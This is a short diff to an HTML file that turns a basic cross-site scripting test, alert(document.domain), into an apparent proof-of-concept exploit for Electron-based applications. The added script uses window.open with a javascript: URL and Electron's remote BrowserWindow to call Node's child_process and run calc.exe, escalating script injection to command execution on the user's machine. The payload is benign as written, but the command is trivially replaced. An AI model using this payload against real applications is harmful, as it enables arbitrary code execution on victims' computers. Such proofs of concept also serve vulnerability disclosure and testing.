@@ -1,5 +1,10 @@
 <html>
 <body>
-<script>alert(document.domain)</script>
+<script>
+  alert(document.domain)
+  window.open("javascript:require('child_process').exec('calc.exe')");
+  var win = new require('electron').remote.BrowserWindow();
+  win.loadURL('javascript:require("child_process").exec("calc.exe")');
+</script>
 </body>
 </html>
